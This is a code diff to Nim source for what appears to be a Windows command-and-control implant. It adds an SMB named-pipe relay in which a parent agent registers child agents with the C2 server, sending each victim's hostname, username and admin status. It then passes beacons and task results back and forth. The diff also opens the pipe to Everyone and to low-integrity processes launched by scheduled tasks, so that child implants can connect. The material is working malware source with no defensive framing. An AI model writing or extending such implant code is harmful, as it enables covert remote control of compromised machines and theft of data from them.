@@ -22,6 +22,16 @@ when defined(windows):
   proc CancelIoEx(hFile: HANDLE, lpOverlapped: pointer): WINBOOL
     {.stdcall, dynlib: "kernel32", importc.}
 
+  proc ConvertStringSecurityDescriptorToSecurityDescriptorW(
+    StringSecurityDescriptor: LPCWSTR,
+    StringSDRevision: DWORD,
+    SecurityDescriptor: ptr PSECURITY_DESCRIPTOR,
+    SecurityDescriptorSize: ptr ULONG): WINBOOL
+    {.stdcall, dynlib: "advapi32", importc.}
+
+  proc LocalFreePs(hMem: HLOCAL): HLOCAL
+    {.stdcall, dynlib: "kernel32", importc: "LocalFree".}
+
   # ── 4-byte LE framing ────────────────────────────────────────────────────────
 
   proc psReadMsg(h: HANDLE): seq[byte] =
@@ -157,76 +167,90 @@ when defined(windows):
       discard CloseHandle(h)
       dealloc(cs)
 
-    let regBytes = psReadMsg(h)
-    if regBytes.len == 0: return 1
-    let regStr = cast[string](regBytes)
-
-    var msgType = ""
-    try: msgType = parseJson(regStr)["type"].getStr("") except: discard
-    if msgType != "REGISTER": return 1
-
-    var hostname, username, osStr, lang, procName: string
-    var pid = 0'i64; var isAdmin = false
-    var sleepSec = SleepSec; var jitter = JitterPct
+    # Outer try/except: swallow any unhandled exception so the parent agent process
+    # is never crashed by malformed data sent by a misbehaving child.
     try:
-      let j = parseJson(regStr)
-      hostname = j{"hostname"}.getStr("")
-      username = j{"username"}.getStr("")
-      osStr    = j{"os"}.getStr("windows/amd64")
-      pid      = j{"pid"}.getBiggestInt(0)
-      isAdmin  = j{"is_admin"}.getBool(false)
-      lang     = j{"language"}.getStr("nim")
-      sleepSec = j{"sleep_sec"}.getInt(SleepSec)
-      jitter   = j{"jitter_pct"}.getInt(JitterPct)
-      procName = j{"process_name"}.getStr("")
+      let regBytes = psReadMsg(h)
+      if regBytes.len == 0: return 1
+      let regStr = cast[string](regBytes)
+
+      var msgType = ""
+      try: msgType = parseJson(regStr)["type"].getStr("") except: discard
+      if msgType != "REGISTER": return 1
+
+      var hostname, username, osStr, lang, procName: string
+      var pid = 0'i64; var isAdmin = false
+      var sleepSec = SleepSec; var jitter = JitterPct
+      try:
+        let j = parseJson(regStr)
+        hostname = j{"hostname"}.getStr("")
+        username = j{"username"}.getStr("")
+        osStr    = j{"os"}.getStr("windows/amd64")
+        pid      = j{"pid"}.getBiggestInt(0)
+        isAdmin  = j{"is_admin"}.getBool(false)
+        lang     = j{"language"}.getStr("nim")
+        sleepSec = j{"sleep_sec"}.getInt(SleepSec)
+        jitter   = j{"jitter_pct"}.getInt(JitterPct)
+        procName = j{"process_name"}.getStr("")
+      except: discard
+
+      let parentId = $cast[cstring](addr cs.parentId[0])
+      let regJson = $(%*{
+        "hostname":     hostname,
+        "username":     username,
+        "os":           osStr,
+        "pid":          pid,
+        "transport":    "smb",
+        "is_admin":     isAdmin,
+        "language":     lang,
+        "sleep_sec":    sleepSec,
+        "jitter_pct":   jitter,
+        "process_name": procName,
+        "parent_id":    parentId
+      })
+      let (code, resp) = psC2Do("POST", "/register", cast[seq[byte]](regJson))
+      if code != 200 or resp.len == 0: return 1
+
+      try:
+        let j    = parseJson(cast[string](resp))
+        let aid  = j["agent_id"].getStr()
+        let kb64 = j["aes_key"].getStr()
+        let key  = cast[seq[byte]](base64.decode(kb64))
+        if aid.len == 0 or key.len < 32: return 1
+        copyMem(addr cs.agentId[0], unsafeAddr aid[0], min(aid.len, 63))
+        copyMem(addr cs.aesKey[0],  unsafeAddr key[0], 32)
+      except: return 1
+
+      psWriteMsg(h, resp)
+
+      while true:
+        let msgBytes = psReadMsg(h)
+        if msgBytes.len == 0: break
+        let msg = cast[string](msgBytes)
+        var mtype = ""
+        try: mtype = parseJson(msg)["type"].getStr("") except: discard
+        if   mtype == "BEACON": psRelayBeacon(h, cs)
+        elif mtype == "RESULT": psRelayResult(msg, cs)
     except: discard
-
-    let parentId = $cast[cstring](addr cs.parentId[0])
-    let regJson = $(%*{
-      "hostname":     hostname,
-      "username":     username,
-      "os":           osStr,
-      "pid":          pid,
-      "transport":    "smb",
-      "is_admin":     isAdmin,
-      "language":     lang,
-      "sleep_sec":    sleepSec,
-      "jitter_pct":   jitter,
-      "process_name": procName,
-      "parent_id":    parentId
-    })
-    let (code, resp) = psC2Do("POST", "/register", cast[seq[byte]](regJson))
-    if code != 200 or resp.len == 0: return 1
-
-    try:
-      let j    = parseJson(cast[string](resp))
-      let aid  = j["agent_id"].getStr()
-      let kb64 = j["aes_key"].getStr()
-      let key  = cast[seq[byte]](base64.decode(kb64))
-      if aid.len == 0 or key.len < 32: return 1
-      copyMem(addr cs.agentId[0], unsafeAddr aid[0], min(aid.len, 63))
-      copyMem(addr cs.aesKey[0],  unsafeAddr key[0], 32)
-    except: return 1
-
-    psWriteMsg(h, resp)
-
-    while true:
-      let msgBytes = psReadMsg(h)
-      if msgBytes.len == 0: break
-      let msg = cast[string](msgBytes)
-      var mtype = ""
-      try: mtype = parseJson(msg)["type"].getStr("") except: discard
-      if   mtype == "BEACON": psRelayBeacon(h, cs)
-      elif mtype == "RESULT": psRelayResult(msg, cs)
     return 0
 
-  # ── NULL-DACL security attributes (allow non-admin children to connect) ──────
-  # NULL lpSecurityDescriptor = NULL DACL = everyone access; no advapi32 needed.
+  # ── Pipe security: World DACL + Low-integrity SACL via SDDL ─────────────────
+  # S:(ML;;NW;;;LW) allows Low-integrity (schtask batch logon) children to connect.
+  # D:(A;;0x1f019f;;;WD) grants Everyone (WD) full read+write+create_instance.
+  # NOTE: lpSecurityDescriptor=nil is the default DACL (creator-only), NOT NULL DACL.
 
-  var gPipeSA = SECURITY_ATTRIBUTES(
-    nLength:              DWORD(sizeof(SECURITY_ATTRIBUTES)),
-    lpSecurityDescriptor: nil,
-    bInheritHandle:       0)
+  var gPipeSD: PSECURITY_DESCRIPTOR = nil  # filled by psMakeSA
+
+  proc psMakeSA(): SECURITY_ATTRIBUTES =
+    let sddl: WideCString = newWideCString("S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)")
+    discard ConvertStringSecurityDescriptorToSecurityDescriptorW(
+      cast[LPCWSTR](sddl), 1, addr gPipeSD, nil)
+    result = SECURITY_ATTRIBUTES(
+      nLength:              DWORD(sizeof(SECURITY_ATTRIBUTES)),
+      lpSecurityDescriptor: gPipeSD,
+      bInheritHandle:       0)
+
+  var gPipeSA = psMakeSA()
 
   # ── Per-server state ─────────────────────────────────────────────────────────
 
